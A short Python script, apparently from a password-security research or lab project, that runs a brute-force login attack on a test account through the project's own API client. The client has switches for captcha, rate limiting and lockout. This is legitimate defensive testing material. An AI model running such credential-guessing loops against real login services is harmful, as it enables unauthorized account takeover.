
from loggers.logger import logger
from file_managers.file_manager import FileManager
from client import ApiClientService
from context import ctx

USER_NAME = "weak_password_user_9"

def brute_force_attack():
    """
    Brute force attack
    :return:
    """
    logger.info("Initializing brute force attack")
    passwords = ctx.file_manager.get_brute_force_passwords
    client_service = ApiClientService(hash_mode=ctx.settings.hash_mode, seed_group=ctx.settings.seed_group, captcha_enabled=ctx.settings.captcha_enabled, rate_limit_enabled=ctx.settings.rate_limit_enabled, user_lockout_enabled=ctx.settings.user_lockout_enabled)
    for password in passwords:
        response = client_service.login_totp(username=USER_NAME, password=password)
        if response["status_code"] == 200:
            break

if __name__ == "__main__":
    brute_force_attack()


